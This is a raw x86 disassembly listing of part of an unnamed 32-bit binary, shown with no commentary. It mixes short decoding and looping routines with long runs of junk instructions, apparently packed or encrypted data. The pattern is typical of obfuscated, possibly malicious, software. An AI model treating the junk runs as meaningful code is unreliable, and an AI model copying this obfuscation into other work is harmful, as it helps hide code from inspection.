  4043d8:	xor    BYTE PTR [eax+eiz*2],dl
  4043db:	xor    DWORD PTR ds:0xfdba850f,ecx
  4043e1:	(bad)  
  4043e2:	call   FWORD PTR [edi+0x5b]
  4043e5:	mov    eax,DWORD PTR [ebp-0x8]
  4043e8:	mov    edx,DWORD PTR [ebp+0x10]
  4043eb:	xor    eax,ecx
  4043ed:	add    eax,esi
  4043ef:	mov    DWORD PTR [edx],eax
  4043f1:	mov    eax,DWORD PTR [ebp-0x8]
  4043f4:	xor    eax,ecx
  4043f6:	add    eax,esi
  4043f8:	mov    DWORD PTR [ebp+0x8],eax
  4043fb:	mov    eax,DWORD PTR [ebp+0x8]
  4043fe:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404402:	mov    dl,BYTE PTR [ebp-0x1]
  404405:	cmp    al,dl
  404407:	je     0x40444a
  40440d:	mov    eax,DWORD PTR [ebp+0x8]
  404410:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404414:	mov    edx,DWORD PTR [ebp+0xc]
  404417:	cmp    al,BYTE PTR [edx]
  404419:	jne    0x40467a
  40441f:	mov    eax,DWORD PTR [ebp-0x8]
  404422:	mov    edx,DWORD PTR [ebp+0xc]
  404425:	movsx  edx,BYTE PTR [edx]
  404428:	xor    eax,ecx
  40442a:	add    eax,esi
  40442c:	cmp    edx,eax
  40442e:	je     0x404464
  404434:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40443b:	lea    eax,[ebp-0x18]
  40443e:	mov    DWORD PTR [ebp-0x14],eax
  404441:	mov    eax,DWORD PTR [ebp-0x14]
  404444:	add    DWORD PTR [eax],0x705fa8f
  40444a:	mov    eax,DWORD PTR [ebp-0x10]
  40444d:	mov    edx,DWORD PTR [ebp+0x8]
  404450:	xor    eax,ecx
  404452:	lea    eax,[eax+edx*1+0x32729e]
  404459:	mov    DWORD PTR [ebp+0x8],eax
  40445c:	inc    DWORD PTR [ebp+0xc]
  40445f:	jmp    0x4043fb
  404464:	mov    eax,DWORD PTR [ebp-0x10]
  404467:	jmp    0x40456c
  40446c:	sbb    esi,DWORD PTR [edi+0x22]
  40446f:	sbb    BYTE PTR [edx],ah
  404471:	cmp    eax,0x7b87773d
  404476:	les    ecx,FWORD PTR ds:0xc148d5e1
  40447c:	mov    dh,0x1c
  40447e:	jl     0x4044fc
  404480:	push   esp
  404481:	jl     0x4044ff
  404483:	jl     0x404473
  404485:	cdq    
  404486:	xchg   DWORD PTR cs:[edx+0x4e],ebx
  40448a:	daa    
  40448b:	sub    eax,DWORD PTR [eax]
  40448d:	mov    eax,0x44706ae9
  404492:	(bad)  
  404493:	ror    esp,1
  404495:	mov    dl,0x10
  404497:	cmp    al,0xd3
  404499:	into   
  40449a:	dec    eax
  40449b:	jns    0x40450f
  40449d:	jne    0x4044d7
  40449f:	imul   ecx,DWORD PTR [ebp-0x1396d449],0xffffffe5
  4044a6:	add    DWORD PTR [edi+edx*8],ebx
  4044a9:	pop    ecx
  4044aa:	xor    al,0xa9
  4044ac:	inc    ebx
  4044ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ae:	imul   ebx,DWORD PTR [ecx],0x298bb86e
  4044b4:	scas   al,BYTE PTR es:[edi]
  4044b5:	and    edi,0x5d
  4044b8:	jns    0x4044b6
  4044ba:	out    0x9e,al
  4044bc:	xchg   edi,eax
  4044bd:	and    dx,si
  4044c0:	repz adc esp,DWORD PTR [edi+0x43bedad5]
  4044c7:	jle    0x404462
  4044c9:	call   0x28e9255
  4044ce:	jmp    0x404464
  4044d0:	idiv   BYTE PTR [ecx+0x4b62f0ad]
  4044d6:	fcomi  st,st(6)
  4044d8:	cmp    DWORD PTR [esi-0x56],ebp
  4044db:	(bad)  
  4044dc:	push   0xffffffa1
  4044de:	leave  
  4044df:	push   es
  4044e0:	push   eax
  4044e1:	fs es or eax,0x78564ae1
  4044e8:	scas   eax,DWORD PTR es:[edi]
  4044e9:	mov    ecx,0xad39c27d
  4044ee:	pop    ds
  4044ef:	push   ss
  4044f0:	test   esi,ebx
  4044f2:	push   ebx
  4044f3:	aam    0x8f
  4044f5:	sub    BYTE PTR [eax+0x3d295494],cl
  4044fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044fc:	mov    es,ecx
  4044fe:	mov    eax,ds:0x70ae9aab
  404503:	and    eax,0x1122c5cd
  404508:	js     0x404556
  40450a:	push   esi
  40450b:	add    eax,0x5c3caa5e
  404510:	das    
  404511:	pop    eax
  404512:	je     0x40456a
  404514:	test   DWORD PTR [edx],esp
  404516:	dec    ebx
  404517:	lods   eax,DWORD PTR ds:[esi]
  404518:	fcom   DWORD PTR [ebp+0x55]
  40451b:	in     al,dx
  40451c:	mov    ds:0xb51e9a61,al
  404521:	jnp    0x40454c
  404523:	xchg   edx,eax
  404524:	imul   BYTE PTR [ebx-0x17]
  404527:	fstp   st(6)
  404529:	in     eax,dx
  40452a:	pop    eax
  40452b:	xchg   edi,eax
  40452c:	inc    edi
  40452d:	or     ah,ah
  40452f:	in     al,dx
  404530:	fistp  QWORD PTR [esi]
  404532:	fs aas 
  404534:	mov    ds:0x4258ae16,al
  404539:	pop    eax
  40453a:	jmp    0x459bb8c3
  40453f:	dec    edx
  404540:	push   0x4a5501e1
  404545:	sti    
  404546:	in     al,dx
  404547:	test   al,0xa9
  404549:	mov    bh,0x19
  40454b:	mov    ebp,0xcade4c67
  404550:	dec    edx
  404551:	arpl   di,bx
  404553:	add    al,0xe0
  404555:	cmp    esi,ecx
  404557:	pop    es
  404558:	mov    eax,ds:0xd4786e9a
  40455d:	cld    
  40455e:	sbb    al,0x9d
  404560:	fs inc ecx
  404562:	(bad)  
  404563:	int    0xe6
  404565:	inc    ebx
  404567:	xchg   ebx,eax
  404568:	xor    BYTE PTR [ebp-0x3ecc9bd4],bl
  40456e:	mov    ecx,DWORD PTR [ebp+0x10]
  404571:	jmp    0x404676
  404576:	imul   eax,DWORD PTR ds:0x7d79fdb1,0x7b
  40457d:	test   DWORD PTR [esi],esp
  40457f:	xchg   ecx,eax
  404580:	retf   
  404581:	fst    QWORD PTR [ecx-0x51add884]
  404587:	pop    ds
  404588:	jl     0x404606
  40458a:	push   esp
  40458b:	jl     0x404609
  40458d:	jl     0x404543
  40458f:	dec    edx
  404590:	dec    esp
  404591:	test   eax,0x13abafc9
  404596:	aam    0x85
  404598:	clc    
  404599:	fdiv   st(2),st
  40459b:	sbb    eax,0xc78f7290
  4045a0:	inc    ebp
  4045a1:	test   eax,0x5209e468
  4045a6:	cmp    eax,0xff66d4bb
  4045ab:	stos   DWORD PTR es:[edi],eax
  4045ac:	mov    eax,0x54ca6692
  4045b1:	jno    0x404568
  4045b3:	cmp    DWORD PTR [esi-0x1c1914ae],ecx
  4045b9:	loopne 0x404568
  4045bb:	nop
  4045bc:	xchg   esi,eax
  4045bd:	inc    esp
  4045be:	shr    edx,1
  4045c0:	sub    al,0x1f
  4045c2:	sbb    BYTE PTR [ecx+0x178dffe1],0x35
  4045c9:	mov    DWORD PTR [eax+0x56dd4f8b],esi
  4045cf:	pop    ds
  4045d0:	scas   al,BYTE PTR es:[edi]
  4045d1:	and    eax,0x7831efb4
  4045d6:	sahf   
  4045d7:	cmovp  esp,DWORD PTR [ebp+0x76]
  4045db:	adc    dl,BYTE PTR [ebx+0x6f1012d3]
  4045e1:	jmp    0x4045fe
  4045e3:	outs   dx,BYTE PTR ds:[esi]
  4045e4:	or     cl,BYTE PTR [edi]
  4045e6:	push   es
  4045e7:	cmp    eax,0x4ae096d8
  4045ec:	shl    BYTE PTR [ebp+ebp*8+0x7e],1
  4045f0:	fadd   st,st(5)
  4045f2:	jg     0x40465b
  4045f4:	call   0x7ba9:0xf80d8855
  4045fb:	push   es
  4045fc:	sub    eax,0x8e5358c6
  404601:	sbb    DWORD PTR [eax],eax
  404603:	test   DWORD PTR ss:[ebp+0x42],ebx
  404607:	adc    eax,0x1ab0bc6d
  40460c:	sub    eax,0xa5d2709e
  404611:	iret   
  404612:	scas   al,BYTE PTR es:[edi]
  404613:	push   es
  404614:	(bad)  
  404615:	cdq    
  404616:	xchg   esi,eax
  404617:	std    
  404618:	dec    edi
  404619:	jbe    0x404658
  40461b:	pusha  
  40461c:	(bad)  
  40461d:	(bad)  
  40461e:	adc    ch,BYTE PTR [edi]
  404620:	xor    BYTE PTR [esi-0x7832dbdb],0x27
  404627:	cmp    ch,al
  404629:	fwait
  40462a:	add    BYTE PTR [eax],al
  40462c:	xor    DWORD PTR [edx-0x4dda7e91],eax
  404632:	scas   eax,DWORD PTR es:[edi]
  404633:	ror    ebp,1
  404635:	cmp    esi,DWORD PTR [ecx+0x4a]
  404638:	(bad)  
  404639:	push   edi
  40463a:	(bad)  
  40463b:	enter  0xb46b,0x46
  40463f:	xchg   BYTE PTR [ecx+0x7f],ah
  404642:	adc    DWORD PTR [ebp+0xf],eax
  404645:	loop   0x40465f
  404647:	sbb    eax,DWORD PTR [eax+0x28]
  40464a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40464b:	sahf   
  40464c:	lods   eax,DWORD PTR ds:[esi]
  40464d:	ds inc eax
  40464f:	and    BYTE PTR [eax-0x134cc60f],dl
  404655:	fild   WORD PTR [ecx+0x4c]
  404658:	outs   dx,BYTE PTR ds:[esi]
  404659:	or     bh,ch
  40465b:	inc    ecx
  40465c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465d:	sbb    ebp,DWORD PTR [edx+0x1d]
  404660:	ja     0x4046b1
  404662:	lea    esp,[edi-0x5df38c64]
  404668:	push   ecx
  404669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40466a:	dec    ebx
  40466b:	push   0x26e2019b
  404670:	outs   dx,DWORD PTR ds:[esi]
  404671:	dec    edi
  404672:	dec    edi
  404673:	xchg   esi,eax
  404674:	or     esi,esi
  404676:	add    eax,esi
  404678:	mov    DWORD PTR [ecx],eax
  40467a:	pop    esi
  40467b:	leave  
  40467c:	ret    0xc
  40467f:	push   ebp
  404680:	mov    ebp,esp
  404682:	push   ecx
  404683:	adc    edx,0x1579
  404689:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404690:	sbb    DWORD PTR ds:0x4292a5,0xe46
  40469a:	mov    eax,DWORD PTR [ebp-0x4]
  40469d:	xor    edx,edx
  40469f:	add    edx,DWORD PTR ds:0x42c8ba
  4046a5:	xor    ecx,ecx
  4046a7:	add    ecx,DWORD PTR ds:0x42c8ce
  4046ad:	sub    edx,ecx
  4046af:	xor    edx,DWORD PTR [edx+ecx*1]
  4046b2:	mov    edx,DWORD PTR [ebp+0x10]
  4046b5:	xor    DWORD PTR ds:0x427cf7,0x3e4e
  4046bf:	mov    ecx,0x7510857
  4046c4:	sbb    DWORD PTR ds:0x427cff,0x4292c5
  4046ce:	xor    eax,ecx
  4046d0:	add    DWORD PTR ds:0x4275ac,0x4292c1
  4046da:	add    eax,0x32729e
  4046df:	mov    DWORD PTR [edx],eax
  4046e1:	adc    DWORD PTR ds:0x427cff,0xab1
  4046eb:	mov    eax,DWORD PTR [ebp+0xc]
  4046ee:	mov    DWORD PTR ds:0x4292c5,0x1c
  4046f8:	cmp    DWORD PTR ds:0x4292c5,0x0
  4046ff:	je     0x4048d6
  404705:	cmp    DWORD PTR ds:0x4292c5,0xd
  40470c:	jne    0x404718
  404712:	call   DWORD PTR ds:0x4279d3
  404718:	cmp    DWORD PTR ds:0x4292c5,0xe
  40471f:	jne    0x404734
  404725:	xor    edx,edx
  404727:	xor    edx,DWORD PTR ds:0x4292c5
  40472d:	dec    edx
  40472e:	mov    DWORD PTR ds:0x4292c5,edx
  404734:	xor    edx,edx
  404736:	xor    edx,DWORD PTR ds:0x4292c5
  40473c:	dec    edx
  40473d:	mov    DWORD PTR ds:0x4292c5,edx
  404743:	jmp    0x4046f8
  404748:	and    DWORD PTR ds:0x427cf7,0x0
  404752:	jmp    0x404766
  404757:	xor    edx,edx
  404759:	or     edx,DWORD PTR ds:0x427cf7
  40475f:	inc    edx
  404760:	mov    DWORD PTR ds:0x427cf7,edx
  404766:	cmp    DWORD PTR ds:0x427cf7,0x1c
  40476d:	jae    0x4048d6
  404773:	cmp    DWORD PTR ds:0x427cf7,0x21
  40477a:	jne    0x404791
  404780:	push   DWORD PTR [ebp-0xc]
  404783:	push   DWORD PTR [ebp-0x28]
  404786:	push   0x3a03
  40478b:	call   DWORD PTR ds:0x4278f3
  404791:	jmp    0x404757
  404796:	jmp    0x4048d6
  40479b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40479c:	mov    eax,0x5df986f9
  4047a1:	gs mov ebx,0x53054722
  4047a7:	mov    ch,0x1e
  4047a9:	mov    eax,ds:0x7c1e868b
  4047ae:	jl     0x4047c1
  4047b0:	jg     0x40482e
  4047b2:	jl     0x404736
  4047b4:	mov    ebx,0xaa45e575
  4047b9:	or     al,0x8f
  4047bb:	dec    edx
  4047bc:	fsub   QWORD PTR [edx+0x6dde73f4]
  4047c2:	or     DWORD PTR [ebx-0x6d70fd08],ebp
  4047c8:	cmp    DWORD PTR [esi],eax
  4047ca:	popf   
  4047cb:	icebp  
  4047cc:	and    eax,0xfea7818e
  4047d1:	std    
  4047d2:	cmp    BYTE PTR [ecx],dh
  4047d4:	sub    BYTE PTR [edx],dh
  4047d6:	xchg   ebp,eax
  4047d7:	stc    
  4047d8:	sahf   
  4047d9:	xchg   edi,eax
  4047da:	imul   ebp,DWORD PTR [ebx+0x14],0xb47878ea
  4047e1:	pop    esp
  4047e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047e3:	daa    
  4047e4:	out    dx,eax
  4047e5:	outs   dx,DWORD PTR ds:[si]
  4047e7:	rcl    DWORD PTR [esp+ebp*8-0x523c46ce],0x42
  4047ef:	pop    ds
  4047f0:	mov    esp,0xd35b04b1
  4047f5:	out    0xf3,al
  4047f7:	gs (bad) 
  4047f9:	adc    eax,0x99e2783c
  4047fe:	nop
  4047ff:	(bad)  
  404800:	icebp  
  404801:	push   ss
  404802:	iret   
  404803:	or     esp,DWORD PTR [esi-0x19186f45]
  404809:	(bad)  
  40480a:	xor    cl,BYTE PTR [ebp-0x34]
  40480d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40480e:	stos   DWORD PTR es:[edi],eax
  40480f:	int3   
  404810:	js     0x40482c
  404812:	in     al,dx
  404813:	push   edx
  404814:	(bad)  
  404815:	ins    DWORD PTR es:[edi],dx
  404816:	and    BYTE PTR [eax-0x1b],dh
  404819:	rol    BYTE PTR [ebx],1
  40481b:	sbb    al,0xa9
  40481d:	mov    DWORD PTR [ecx],0x98fb66ff
  404823:	mov    al,ds:0xf71bb3ae
  404828:	push   0x454b54f0
  40482d:	int    0x58
  40482f:	test   DWORD PTR [ebp-0x36],eax
  404832:	imul   eax,DWORD PTR [eax],0xb66c8c5d
  404838:	call   0xae364093
  40483d:	push   ss
  40483e:	mov    eax,ds:0x5da6d731
  404843:	cdq    
  404844:	aad    0x1b
  404846:	loope  0x40482a
  404848:	inc    ebx
  404849:	sti    
  40484a:	jmp    0x98d5c948
  40484f:	push   0xd812ff4e
  404854:	and    esi,DWORD PTR [edx+0x4e]
  404857:	sbb    edi,ebp
  404859:	vunpckhps xmm7,xmm6,XMMWORD PTR [edx]
  40485d:	stc    
  40485e:	bound  ecx,QWORD PTR [edx-0x2c6751a1]
  404864:	test   DWORD PTR es:[ebp-0x49751ad4],edx
  40486b:	sub    edi,DWORD PTR [edi+0xce86bb4]
  404871:	data16 out dx,al
  404873:	cmp    al,0x4b
  404875:	(bad)  
  404876:	jno    0x404887
  404878:	int    0x44
  40487a:	or     ebp,edi
  40487c:	adc    al,0xa6
  40487e:	lahf   
  40487f:	pop    eax
  404880:	test   BYTE PTR [ebp-0x62],cl
  404883:	or     ah,BYTE PTR [esi+0x587dc5ac]
  404889:	xor    DWORD PTR [edx-0x1624a7a3],ecx
  40488f:	cwde   
  404890:	adc    al,0x70
  404892:	jno    0x404840
  404894:	rcr    DWORD PTR [ebp+0x4cd82e52],1
  40489a:	test   eax,0x4357641
  40489f:	call   0x7fcd18d8
  4048a4:	mov    ebx,0xf43a5ec5
  4048a9:	jno    0x404836
  4048ab:	xor    bl,ah
  4048ad:	or     BYTE PTR [eax-0x5ef87803],0x18
  4048b4:	mov    edx,0xd5b02590
  4048b9:	add    eax,0xf7eb5f8b
  4048be:	and    edx,0x5465601f
  4048c4:	in     eax,0x0
  4048c6:	stos   DWORD PTR es:[edi],eax
  4048c7:	pop    ebx
  4048c8:	outs   dx,BYTE PTR ds:[esi]
  4048c9:	mov    edi,0x8d010079
  4048ce:	test   DWORD PTR [edi-0x76b6d83],esp
  4048d4:	pop    ss
  4048d5:	out    0x33,al
  4048d7:	rcl    DWORD PTR [esi-0x75],0x75
  4048db:	adc    BYTE PTR [edx+0x32729e],bh
  4048e1:	add    eax,edx
  4048e3:	mov    DWORD PTR [esi+0x4],eax
  4048e6:	mov    eax,DWORD PTR [ebp+0x14]
  4048e9:	mov    esi,DWORD PTR [ebp+0x10]
  4048ec:	mov    DWORD PTR [esi+0x8],eax
  4048ef:	mov    eax,DWORD PTR [ebp+0x18]
  4048f2:	mov    esi,DWORD PTR [ebp+0x10]
  4048f5:	mov    DWORD PTR [esi+0xc],eax
  4048f8:	mov    eax,DWORD PTR [ebp+0x1c]
  4048fb:	mov    esi,DWORD PTR [ebp+0x10]
  4048fe:	jmp    0x404a3e
  404903:	shl    DWORD PTR [ebx+0x7],0xc
  404907:	mov    ebp,0x4065d978
  40490c:	mov    eax,ds:0x857ee8b5
  404911:	in     al,0x2e
  404913:	mov    ebx,0x117c7c11
  404918:	jg     0x404996
  40491a:	jl     0x4048bc
  40491c:	jmp    0x5946b5eb
  404921:	fwait
  404922:	loope  0x404920
  404924:	push   ds
  404925:	jns    0x4048f3
  404927:	sub    al,0xa8
  404929:	jnp    0x4048b4
  40492b:	(bad)  
  40492c:	mov    ebx,0xe60cbd8d
  404931:	aad    0x92
  404933:	jb     0x404956
  404935:	stos   DWORD PTR es:[edi],eax
  404936:	jmp    0x17a2896c
  40493b:	repnz or eax,ebp
  40493e:	std    
  40493f:	retf   
  404940:	aam    0x46
  404942:	add    al,0x87
  404944:	or     ebp,DWORD PTR ds:0xe202b4c9
  40494a:	aam    0x25
  40494c:	pop    esi
  40494d:	js     0x40497d
  40494f:	mov    ecx,0x9cc4388c
  404954:	icebp  
  404955:	push   eax
  404956:	cmc    
  404957:	ss (bad) 
  404959:	mov    eax,ds:0x968df27e
  40495e:	pusha  
  40495f:	mov    ebx,0xe22b9438
  404964:	cld    
  404965:	mov    al,0x64
  404967:	cmp    al,0xdb
  404969:	mov    esp,0x3d1c8b01
  40496e:	xchg   ebx,eax
  40496f:	aaa    
  404970:	nop
  404971:	pop    ebp
  404972:	fwait
  404973:	inc    eax
  404974:	sar    BYTE PTR [esi-0x7b4c8d7c],0xd8
  40497b:	mov    bh,0x58
  40497d:	cmp    BYTE PTR [ebx+0x12],ah
  404980:	mov    edi,0x57712248
  404985:	add    DWORD PTR [ecx+0x7aadaef5],edi
  40498b:	shl    BYTE PTR [esi+0x7d],1
  40498e:	jo     0x404986
  404990:	jne    0x4049e7
  404992:	repz and bh,dh
  404995:	and    al,0xbd
  404997:	push   es
  404998:	(bad)  
  404999:	loopne 0x4049bf
  40499b:	jb     0x4049ce
  40499d:	lea    edi,[edi+0x21613a0e]
  4049a3:	or     dl,BYTE PTR [edx]
  4049a5:	call   0xca1e8de0
  4049aa:	or     BYTE PTR [ecx+0x505c77d6],ch
  4049b0:	loopne 0x404a30
  4049b2:	sar    BYTE PTR [ebx-0x1b],1
  4049b5:	jmp    0x40498b
  4049b7:	sub    eax,0x930cb532
  4049bc:	xchg   esi,eax
  4049bd:	cmp    eax,0x4ecf6407
  4049c2:	pop    es
  4049c3:	js     0x40494e
  4049c5:	sbb    dh,BYTE PTR [edi+0x18]
  4049c8:	idiv   BYTE PTR [ebx-0x41]
  4049cb:	xor    al,0x16
  4049cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ce:	clc    
  4049cf:	xchg   ebx,eax
  4049d0:	into   
  4049d1:	inc    ebp
  4049d2:	mov    ah,0x7
  4049d4:	xor    al,bh
  4049d6:	pop    ebp
  4049d7:	xor    BYTE PTR ss:[edx+0x61d1eecd],dl
  4049de:	in     eax,dx
  4049df:	test   al,0xb6
  4049e1:	mov    edi,0x23da8fd6
  4049e6:	loop   0x404a47
  4049e8:	lods   al,BYTE PTR ds:[esi]
  4049e9:	sub    BYTE PTR [ebp-0x6fe68c07],ah
  4049ef:	rol    DWORD PTR ds:0xfd0d2ee5,cl
  4049f5:	lea    esi,ds:0xfd908832
  4049fb:	iret   
  4049fc:	or     BYTE PTR [esi-0x60],ah
  4049ff:	stc    
  404a00:	mov    cl,0x15
  404a02:	cmc    
  404a03:	dec    esp
  404a04:	pop    ebx
  404a05:	mov    ch,0xf3
  404a07:	and    BYTE PTR [esi+0x33],dh
  404a0a:	pop    esp
  404a0b:	nop
  404a0c:	jle    0x404a21
  404a0e:	mov    eax,ds:0x59fc393e
  404a13:	push   es
  404a14:	fst    QWORD PTR [ecx+0x62]
  404a17:	repz pop es
  404a19:	fucomip st,st(0)
  404a1b:	je     0x4049af
  404a1d:	mov    al,0x55
  404a1f:	mov    edx,0x68f3de25
  404a24:	in     al,dx
  404a25:	xchg   edx,eax
  404a26:	int    0x83
  404a28:	fstp   DWORD PTR [ebx-0x68ed0e0d]
  404a2e:	loop   0x404a24
  404a30:	imul   ebp,DWORD PTR [ebx],0x78
  404a33:	scas   al,BYTE PTR es:[edi]
  404a34:	in     eax,dx
  404a35:	fidivr DWORD PTR [ecx-0x5e]
  404a38:	dec    esp
  404a39:	adc    edx,DWORD PTR [ebx]
  404a3b:	mov    ecx,0x4689ea2f
  404a40:	adc    BYTE PTR [ebx+0x8458bc0],cl
  404a46:	xor    eax,ecx
  404a48:	add    eax,edx
  404a4a:	pop    esi
  404a4b:	leave  
  404a4c:	ret    0x18
  404a4f:	push   ebp
  404a50:	mov    ebp,esp
  404a52:	mov    eax,DWORD PTR [ebp+0xc]
  404a55:	xor    edx,edx
  404a57:	mov    ecx,0x7264fcad
  404a5c:	div    ecx
  404a5e:	jmp    0x404b9e
  404a63:	outs   dx,BYTE PTR ds:[esi]
  404a64:	stc    
  404a65:	sti    
  404a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a67:	jnp    0x404a23
  404a69:	gs stc 
  404a6b:	dec    esi
  404a6c:	xchg   DWORD PTR [ebx+0x7018150d],esp
  404a72:	adc    BYTE PTR [eax+edx*1+0x7c],bl
  404a76:	jl     0x404a89
  404a78:	jg     0x404af6
  404a7a:	jl     0x404a6c
  404a7c:	pop    ds
  404a7d:	fwait
  404a7e:	out    dx,eax
  404a7f:	fs cld 
  404a81:	sbb    BYTE PTR [edx-0x2],al
  404a84:	and    BYTE PTR [ecx-0x48],0xea
  404a88:	test   DWORD PTR [ebx-0x21],ebp
  404a8b:	or     eax,DWORD PTR [eax-0x41a4c535]
  404a91:	dec    esi
  404a92:	inc    ebx
  404a93:	xchg   edx,eax
  404a94:	scas   al,BYTE PTR es:[edi]
  404a95:	jecxz  0x404af4
  404a97:	cdq    
  404a98:	sbb    al,bl
  404a9a:	imul   ebx,DWORD PTR [edi+0x1111146a],0x6027a3b5
  404aa4:	jg     0x404ad2
  404aa6:	daa    
  404aa7:	test   eax,0x485d551
  404aac:	mov    ah,0x27
  404aae:	mov    bh,0xe6
  404ab0:	mov    ah,0xde
  404ab2:	mov    ah,0x70
  404ab4:	test   ebx,edi
  404ab6:	cmp    BYTE PTR [edx],bl
  404ab8:	cmp    eax,0xfbbaa292
  404abd:	jmp    0x404a93
  404abf:	mov    edi,0x74731ad
  404ac4:	(bad)  
  404ac5:	sahf   
  404ac6:	cli    
  404ac7:	pop    edx
  404ac8:	adc    dl,BYTE PTR [edx-0x11760ef5]
  404ace:	add    al,0xde
  404ad0:	outs   dx,BYTE PTR ds:[esi]
  404ad1:	and    eax,0xc3f9d69e
  404ad6:	js     0x404a74
  404ad8:	loope  0x404af0
  404ada:	cmp    al,0xa3
  404adc:	push   eax
  404add:	or     cl,BYTE PTR [eax]
  404adf:	call   edi
  404ae1:	xchg   ecx,eax
  404ae2:	leave  
  404ae3:	sar    BYTE PTR [edi+0x10],0x56
  404ae7:	out    0xce,al
  404ae9:	(bad)  [edx]
  404aeb:	imul   ecx,DWORD PTR [ebx+eiz*2-0x34],0x97b33fbb
  404af3:	inc    edi
  404af4:	les    eax,FWORD PTR [ebp-0x7]
  404af7:	(bad)  
  404af8:	test   eax,0x54921a55
  404afd:	push   edi
  404afe:	mov    bl,0xef
  404b00:	push   cs
  404b01:	push   ecx
  404b02:	cs or  al,0xe4
  404b05:	arpl   si,sp
  404b07:	lahf   
  404b08:	icebp  
  404b09:	std    
  404b0a:	repnz inc ecx
  404b0c:	or     esi,DWORD PTR [ecx-0x42]
  404b0f:	fisttp QWORD PTR [ebx+0x2c14982a]
  404b15:	ins    BYTE PTR es:[edi],dx
  404b16:	xbegin 0x1ed99f8f
  404b1c:	sub    DWORD PTR [ebp-0x63e01f3c],eax
  404b22:	dec    ebx
  404b23:	pop    esp
  404b24:	fadd   st(4),st
  404b26:	inc    edx
  404b27:	test   DWORD PTR [esi-0x7bed6449],edi
  404b2d:	jae    0x404b18
  404b2f:	shl    DWORD PTR [edx+0x269719f1],cl
  404b35:	and    BYTE PTR ds:[esi-0x672c0b28],0xbf
  404b3d:	ins    DWORD PTR es:[edi],dx
  404b3e:	add    eax,0x654a766b
  404b43:	xchg   esp,eax
  404b44:	ret    
  404b45:	pop    esi
  404b46:	fs dec esi
  404b48:	push   eax
  404b49:	xchg   esi,eax
  404b4a:	ins    DWORD PTR es:[edi],dx
  404b4b:	jl     0x404b75
  404b4d:	mov    bh,0xc
  404b4f:	(bad)  
  404b50:	mov    ebx,0xa21dfcca
  404b55:	sub    ch,0x22
  404b58:	gs push esi
  404b5a:	and    al,0x79
  404b5c:	sbb    bh,BYTE PTR [ecx]
  404b5e:	push   edi
  404b5f:	cmc    
  404b60:	sbb    al,0xfb
  404b62:	les    esp,FWORD PTR [esp+eax*8-0x4c]
  404b66:	sbb    DWORD PTR [edi],edi
  404b68:	jl     0x404bbb
  404b6a:	sbb    bh,BYTE PTR [ecx+edi*8]
  404b6d:	pop    es
  404b6e:	outs   dx,DWORD PTR ds:[esi]
  404b6f:	mov    ds:0xf6339963,eax
  404b74:	add    al,0x48
  404b76:	inc    edi
  404b77:	jbe    0x404b93
  404b79:	(bad)  
  404b7a:	push   eax
  404b7b:	shl    bl,0xb8
  404b7e:	add    eax,0xe797e5f1
  404b83:	test   BYTE PTR [ecx],ch
  404b85:	mov    dh,0x78
  404b87:	push   edx
  404b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b89:	fcomip st,st(0)
  404b8b:	adc    BYTE PTR [ebp-0x2a122fdb],ah
  404b91:	and    dh,BYTE PTR [edi]
  404b93:	inc    edi
  404b94:	int    0xd0
  404b96:	not    BYTE PTR ds:0x2ae19b38
  404b9c:	push   0x104d8b8c
  404ba1:	and    ecx,eax
  404ba3:	or     ecx,0x81161d8f
  404ba9:	jmp    0x404ce9
  404bae:	in     al,dx
  404baf:	xchg   ebx,eax
  404bb0:	imul   eax,esp,0x7b
  404bb3:	les    esp,FWORD PTR [ebx-0x55]
  404bb6:	jmp    0xa02ccde5
  404bbb:	ja     0x404c02
  404bbd:	pusha  
  404bbe:	jno    0x404bd2
  404bc0:	jl     0x404c3e
  404bc2:	adc    DWORD PTR [edi+0x7c],edi
  404bc5:	jl     0x404b7e
  404bc7:	mov    eax,0xcb66a451
  404bcc:	retf   0x4729
  404bcf:	retf   
  404bd0:	mov    bh,0xb1
  404bd2:	dec    ebp
  404bd3:	push   esp
  404bd4:	data16 or al,0x6e
  404bd7:	mov    dh,0xa8
  404bd9:	sub    al,0xab
  404bdb:	imul   esi
  404bdd:	pusha  
  404bde:	fbstp  TBYTE PTR ds:0x69848453
  404be4:	jmp    0x42470ce8
  404be9:	add    bh,ch
  404beb:	push   ebx
  404bec:	mov    eax,ds:0x7fff4a60
  404bf1:	(bad)  
  404bf2:	lock jmp 0xc174:0xe33a1592
  404bfa:	inc    ebx
  404bfb:	or     edi,DWORD PTR [esi]
  404bfd:	xor    ah,bl
  404bff:	dec    ebp
  404c00:	outs   dx,BYTE PTR ds:[esi]
  404c01:	mov    ds:0x293b7eb1,al
  404c06:	sbb    al,0xe4
  404c08:	jle    0x404c3a
  404c0a:	daa    
  404c0b:	xchg   esp,eax
  404c0c:	jge    0x404c28
  404c0e:	gs dec ecx
  404c10:	mov    cl,BYTE PTR [edi]
  404c12:	lea    esp,[edi-0x1]
  404c15:	enter  0x6994,0x9d
  404c19:	adc    eax,0xc37ac1
  404c1e:	sbb    al,0x84
  404c20:	test   DWORD PTR ds:0xf2dd4e19,eax
  404c26:	lods   al,BYTE PTR ds:[esi]
  404c27:	pop    esi
  404c28:	clc    
  404c29:	jmp    0x404c91
  404c2b:	add    BYTE PTR [esi+ecx*8+0x2e],0xe0
  404c30:	push   cs
  404c31:	loop   0x404bbf
  404c33:	bound  esi,QWORD PTR [ebx+0x458db774]
  404c39:	pop    esp
  404c3a:	add    dh,BYTE PTR [eax+ecx*8]
  404c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c3e:	and    edi,DWORD PTR [edx+ebx*1-0x66]
  404c42:	push   cs
  404c43:	push   esi
  404c44:	xor    ch,BYTE PTR [edx+0x68b6a2fc]
